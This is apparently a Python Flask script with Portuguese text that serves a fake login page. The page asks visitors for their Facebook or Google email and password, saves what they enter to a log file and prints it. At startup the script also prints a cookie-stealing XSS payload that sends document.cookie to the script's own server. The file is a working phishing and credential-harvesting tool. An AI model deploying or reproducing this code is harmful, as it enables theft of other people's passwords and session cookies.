from flask import Flask, request, render_template_string

app = Flask(__name__)

print("\n\n<script>document.location='http://127.0.0.1:80/?cookie=' + document.cookie;</script>\n====================================================================================\n")


# Página HTML de Login
login_page = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Página de login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            width: 300px;
            text-align: center;
        }
        .container h2 {
            margin: 0 0 20px 0;
        }
        .btn {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            text-align: center;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn img {
            margin-right: 10px;
            width: 24px;
            height: 24px;
        }
        .btn-facebook {
            background-color: #3b5998;
            color: white;
            cursor: not-allowed; /* Desabilita o botão */
        }
        .btn-google {
            background-color: #4285f4;
            color: white;
            border: 1px solid #dcdcdc;
            cursor: not-allowed; /* Desabilita o botão */
        }
        .btn-facebook:hover, .btn-google:hover {
            opacity: 0.9;
        }
        .or {
            text-align: center;
            margin: 20px 0;
            color: #888;
        }
        .input-group {
            margin: 10px 0;
        }
        .input-group input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .forgot-password {
            text-align: center;
            margin: 10px 0;
            color: #888;
        }
        .btn-login {
            background-color: #089939;
            color: white;
        }
        .btn-login:hover {
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="container">
    <h2>Página de login</h2>
        <!-- Botões de Login -->
        <button class="btn btn-facebook" disabled>
            <img src="https://i.pinimg.com/originals/67/b5/47/67b547050a572e487c5a9e57587f3377.jpg" alt="Facebook Logo">
            ENTRAR COM O FACEBOOK
        </button>
        <button class="btn btn-google" disabled>
            <img src="https://bandodequadrados.com/img/imagem_noticia/f9ec22c82ebf65ca7bb36aeb460a8f59.jpg" alt="Google Logo">
            FAÇA LOGIN COM O GOOGLE
        </button>
        <!-- Separador -->
        <div class="or"></div>
        <!-- Formulário de Login -->
        <form action="/registrar_log" method="post">
            <input type="hidden" name="source" value="form">
            <div class="input-group">
                <input type="email" name="email" placeholder="Digite Email do Facebook ou do Google" required>
            </div>
            <div class="input-group">
                <input type="password" name="senha" placeholder="Digite sua senha do Facebook ou do Google" required>
            </div>
            <div class="forgot-password"></div>
            <button type="submit" class="btn btn-login">CONECTE-SE</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET'])
def index():
    return render_template_string(login_page)

@app.route('/registrar_log', methods=['POST'])
def registrar_log():
    email = request.form.get('email')
    password = request.form.get('senha')
    source = request.form.get('source')

    try:
        # Gravar no arquivo
        with open('log.txt', 'a', encoding='utf-8') as f:
            f.write(f'Email: {email}  Password: {password}\n')

        # Exibir no terminal
        print(f'\n\nEmail: {email}   Password: {password}\n\n')

        return 'Login recebido com sucesso', 200
    except Exception as e:
        return f'Erro ao gravar dados de login: {e}', 500

if __name__ == '__main__':    
    app.run(host='127.0.0.1', port=80, debug=True)

